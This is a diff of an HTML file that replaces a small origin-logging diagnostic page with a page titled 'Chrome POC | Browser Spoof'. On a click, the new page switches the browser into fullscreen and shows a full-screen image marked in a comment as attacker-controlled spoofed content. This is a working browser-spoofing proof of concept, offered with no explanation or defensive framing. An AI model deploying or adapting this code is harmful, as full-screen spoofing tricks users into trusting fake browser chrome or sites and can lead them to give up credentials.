@@ -1,176 +1,59 @@
-<!doctype html>
 <html>
+
 <head>
-<meta charset="utf-8">
-<title>Origin Navigation Diagnostic Test</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-
-<style>
-body {
-    font-family: -apple-system, BlinkMacSystemFont, system-ui;
-    background:#f5f5f7;
-    padding:30px;
-}
-
-.box {
-    max-width:500px;
-    margin:auto;
-    background:white;
-    padding:25px;
-    border-radius:16px;
-    box-shadow:0 10px 40px rgba(0,0,0,.15);
-}
-
-button {
-    background:#007aff;
-    color:white;
-    border:0;
-    padding:12px 20px;
-    border-radius:10px;
-    font-size:16px;
-}
-
-pre {
-    background:#111;
-    color:#00ff90;
-    padding:15px;
-    border-radius:10px;
-    font-size:12px;
-    overflow:auto;
-}
-</style>
-
+    <style>
+        #front {
+            align-items: center;
+            justify-content: center;
+            display: block;
+        }
+        
+        #spoofed {
+            display: none;
+        }
+    </style>
+    <title>Chrome POC | Browser Spoof</title>
 </head>
 
 
-<body>
+<body style="margin: 0;font-family: 'Ubuntu', Arial, sans-serif;">
+
+    <!--Front Page-->
+    <div id="front" onclick="run();">
+        <div style="display: flex; justify-content: center; align-items: center; height: 75vh;">
+            <div style="background-color: #fff; padding: 50px; box-shadow: 0px 0px 10px rgba(0,0,0,0.2); border-radius: 10px;width: 50vw;">
+                <img src="https://play-lh.googleusercontent.com/KwUBNPbMTk9jDXYS2AeX3illtVRTkrKVh5xR1Mg4WHd0CG2tV4mrh1z3kXi5z_warlk=w240-h480-rw" style="display: block; margin: 0 auto;height: 15vw;" />
+                <br>
+                <center>
+                    <h1>Click anywhere on the page to Spoof</h1>
+                </center>
+            </div>
+        </div>
+    </div>
 
 
-<div class="box">
+    <!--Spoofed Page-->
+    <div id="spoofed">
 
-<h2>Origin Transition Diagnostic</h2>
+        <!--Attacker controlled Spoofed content-->
+        <img src="spoof.png" style="width: 100vw;height: 100vh;" />
 
-<p>
-Records origin state before and after navigation.
-</p>
-
-
-<button id="start">
-Start Test
-</button>
+    </div>
 
 
-<pre id="output">
-Waiting...
-</pre>
+    <script>
+        function run() {
+            const firstDiv = document.getElementById("front");
+            const secondDiv = document.getElementById("spoofed");
+            secondDiv.style.display = "block";
+            firstDiv.style.display = "none";
 
 
-</div>
+            document.documentElement.requestFullscreen();
 
 
-
-<script>
-
-const output =
-document.getElementById("output");
-
-
-let logs=[];
-
-
-function log(event, extra={}) {
-
-
-    const data={
-
-        event,
-
-        time:new Date().toISOString(),
-
-        href:location.href,
-
-        origin:location.origin,
-
-        pathname:location.pathname,
-
-        ...extra
-
-    };
-
-
-    logs.push(data);
-
-
-    output.textContent =
-    JSON.stringify(logs,null,2);
-
-
-    console.log(data);
-
-}
-
-
-
-log("loaded");
-
-
-
-document
-.getElementById("start")
-.onclick=function(){
-
-
-    log(
-        "before_navigation",
-        {
-            note:"Current origin before navigation"
         }
-    );
-
-
-
-    /*
-       Replace this with your own controlled test origin.
-       Example:
-       https://your-test-domain.example/page2
-    */
-
-
-    const target =
-    "https://google.com:9090";
-
-
-
-    log(
-        "navigation_requested",
-        {
-            target
-        }
-    );
-
-
-
-    location.href=target;
-
-
-};
-
-
-
-
-window.addEventListener(
-"pageshow",
-()=>{
-
-    log(
-        "pageshow_after_navigation"
-    );
-
-});
-
-
-</script>
-
-
+    </script>
 </body>
+
 </html>
